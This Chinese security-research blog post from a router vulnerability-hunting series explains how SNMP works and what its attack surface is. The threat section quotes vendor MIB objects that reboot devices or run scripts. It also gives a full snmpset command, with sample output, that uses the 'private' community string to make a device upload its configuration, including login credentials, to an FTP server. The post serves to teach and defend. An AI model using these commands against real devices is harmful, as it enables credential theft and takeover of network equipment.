#  手把手玩转路由器漏洞挖掘系列 - SNMP协议分析   
原创 nil  山石网科安全技术研究院   2023-11-01 18:17  
  
## 1. 基本介绍  
### 1.1 概要  
  
SNMP协议(Simple Network Management Protocol,SNMP)原名叫做简单网关协议。该协议是基于简单网关监视协议指定的，是专门设计用于在IP网络管理网络节点的一种标准协议，是一种应用层协议。  
  
主要作用帮助网络管理员提高网络管理效率，及时发现和解决网络问题，对网络增长做好规划。可以使网络管理员通过一台工作站完成对计算机、路由器和其他网络设备的远程管理和监视。利用SNMP协议可以更好地管理和监控网络。管理工作站可以远程管理所有支持该协议的网络设备，如监视网络状态、修改网络设备配置、接受网络较高等。  
### 1.2 协议版本  
- SNMP v1 - 初始版本  
  
- SNMP v2 - 对比第一版在性能、安全、机密性和管理者之间通信等方面进行了大量改进  
  
- SNMP v3 - 相比第二版增加了认证、秘文传输功能  
  
### 1.3 协议格式  
  
SNMP消息由头部和PDU组成。头部包含版本号、commuity字符串和PDU类型等信息。  
  
头部  
- 版本号 - SNMP协议版本  
  
- community字符串 - 身份认证  
  
- PDU类型 - 请求/响应  
  
PDU  
- 请求ID - ID号  
  
- 错误状态码 - 错误返回码  
  
- 错误索引 - 错误索引号  
  
- 变量绑定 - 要操作的变量和对应值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ8eJxBZMouqlevn8OahgLN46E99k0kfltNcpeKlhrMibNd4pl4y5cicibicFzp40TUjGwPxtBM6OJj1w/640?wx_fmt=png "")  
### 1.4 架构组成  
- 社区  
  
同一管理框架下的网络管理站和所有节点的集合  
- 网络管理站  
  
管理控制台  
- 节点  
  
网络上的设备  
### 1.5 操作类型  
- get-request: NMS从SNMP Agent处提取一个或多个参数值  
  
- get-response：返回一个或多个参数的值  
  
- get-next-request: 网络管理站NMS从SNMP代理处提取一个或者多个参数的下一个参数值  
  
- set-request: 网络管理站NMS设置SNMP代理处获取MIB的相关参数值  
  
- trap: SNMP代理主动向网络管理站NMS发送报文消息  
  
- informRequest： SNMP代理主动向网络管理站NMS发送报文消息，NMS进行响应  
  
### 1.6 操作命令  
- Get:管理站读取代理者处对象的值  
  
- Set:管理站设置代理者处对象的值  
  
- Trap:代理者主动向管理站通报重要事件  
  
## 2. 工作原理  
  
发现、查询、监视设备状态信息  
  
分为4个步骤  
- 当管理员查询被管理设备中的对象的相关值时，首先通过网络管理站 NMS 中的 MIB 找到相关对象  
  
- 网络管理站 NMS 向 SNMP 代理申请 MIB 中定义对象的相关值  
  
- SNMP 代理在自己的 MIB 库中进行查找  
  
- SNMP 代理将找到的对象相关值返回给网络管理站 NMS  
  
## 3. 报文分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ8eJxBZMouqlevn8OahgLNUXeJuJwZgicQyCQhAey02swkkuvYx5HXkT4zeNaHicY74vK7pnA46f7w/640?wx_fmt=png "")  
  
协议类型-团体字符串-操作方式 - 查看设备使用的操作系统以及其他信息  
## 4. 安全风险  
  
①修改信息（Modification of Information):就是某些未经授权的实体改变了进来的SNMP报文，企图实施未经授权的管理操作，或者提供虚假的管理对象。  
  
②假冒（Masquerade):即未经授权的用户冒充授权用户的标识，企图实施管理操作。  
## 5. 威胁分析  
### 5.1 敏感信息  
- MIB文件  
  
MIB是一个被管理对象的集合，是NMS同Agent进行沟通的桥梁，可以使网管软件和设备进行标准对接。每一个Agent都维护这样一个MIB库，NMS可以对MIB库中对象的值进行读取或设置。  
- 树结构  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ8eJxBZMouqlevn8OahgLNzr5qvvYRAD3BCVpR0k7p1SUL1VUuXfECLuTnVykwqH38usbmtnoXrg/640?wx_fmt=png "")  
  
某设备厂商MIB  
```
mtxrSystemReboot OBJECT-TYPE
    SYNTAX Integer32
    MAX-ACCESS read-write
    STATUS current
    DESCRIPTION "set non zero to reboot" 
    ::= { mtxrSystem 1 }

mtxrUSBPowerReset OBJECT-TYPE
    SYNTAX Integer32
    MAX-ACCESS read-write
    STATUS current
    DESCRIPTION "switches off usb power for specified amout of seconds"

mtxrScriptRunCmd OBJECT-TYPE
    SYNTAX Integer32
    MAX-ACCESS read-write
    STATUS current
    DESCRIPTION "set non zero to run" 
    ::= { mtxrScriptTableEntry 3 }

```  
- 设备重启操作 - mtxSystemReboot  
  
- USB电源操作 - mtxrUSBPowerReset  
  
- 脚本执行操作 - mtxScriptRunCmd  
  
### 5.2 获取设备配置信息  
  
**常使用命令**  
  
snmpwalk、snmpset、snmpget  
  
某设备获取配置文件  
```
# 使用FTP协议将Agent上的当前配置备份到FTP server（192.168.1.46），用户名为ftp，密码为123，文件名为aa.cfg。

C:\usr\bin> snmpset -v 1 -c private 192.168.1.40 1.3.6.1.4.1.25506.2.4.1.2.4.1.2.2 i 3 1.3.6.1.4.1.25506.2.4.1.2.4.1.3.2 i 1 1.3.6.1.4.1.25506.2.4.1.2.4.1.4.2 s aa.cfg 1.3.6.1.4.1.25506.2.4.1.2.4.1.5.2 a 192.168.1.46 1.3.6.1.4.1.25506.2.4.1.2.4.1.6.2 s ftp 1.3.6.1.4.1.25506.2.4.1.2.4.1.7.2 s 123123123123 1.3.6.1.4.1.25506.2.4.1.2.4.1.9.2 i 4
# 将返回下面的响应信息：

iso.3.6.1.4.1.25506.2.4.1.2.4.1.2.2 = INTEGER: 3

iso.3.6.1.4.1.25506.2.4.1.2.4.1.3.2 = INTEGER: 1

iso.3.6.1.4.1.25506.2.4.1.2.4.1.4.2 = STRING: "aa.cfg"

iso.3.6.1.4.1.25506.2.4.1.2.4.1.5.2 = IpAddress: 192.168.1.46

iso.3.6.1.4.1.25506.2.4.1.2.4.1.6.2 = STRING: "ftp"

iso.3.6.1.4.1.25506.2.4.1.2.4.1.7.2 = STRING: "123123123123"

iso.3.6.1.4.1.25506.2.4.1.2.4.1.9.2 = INTEGER: 4
#取值
1.3.6.1.4.1.25506.2.4.1.2.4.1.2 = 3 hh3cCfgOperateType对象 3-把当前系统运行的配置通过网络发送到远端服务器指定位置的文件中
1.3.6.1.4.1.25506.2.4.1.2.4.1.3 = 1 hh3cCfgOperateProtocol对象 1-表示使用ftp协议
1.3.6.1.4.1.25506.2.4.1.2.4.1.4.2 = aa.cfg  hh3cCfgOperateFileName 传输源文件的文件名
1.3.6.1.4.1.25506.2.4.1.2.4.1.5.2 = 192.168.1.46 指定ftp和tftp服务器地址
1.3.6.1.4.1.25506.2.4.1.2.4.1.6.2 = ftp 指定ftp用户
1.3.6.1.4.1.25506.2.4.1.2.4.1.7.2 = 123123123123 指定密码
1.3.6.1.4.1.25506.2.4.1.2.4.1.9.2 = 4 h3cCfgOperateRowStatus对象 表示创建一行，并立即执行

```  
  
配置文件包含登陆用户名和密码  
### 5.3 公网获取敏感信息  
  
获取思科路由器相关配置信息![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ8eJxBZMouqlevn8OahgLNTslEktXEkBKn8zY87WexiaoZkhxU1ReFq3TlGU9t25ic6BL9ytkEcDyg/640?wx_fmt=png "")  
  
## SNMP服务攻击面  
- 通过获取不同设备厂商的MIB文件，执行敏感action操作  
  
- 获取敏感信息，如配置信息、运行配置文件及对应操作系统  
  
## 总结  
  
SNMP协议作为网络管理的常用协议，给网络管理人员带来便利的同时也隐藏着一些安全隐患。建议运维人员在日常SNMP服务中设置用户认证，防止被攻击者获取边界设备的敏感信息。  
  
  
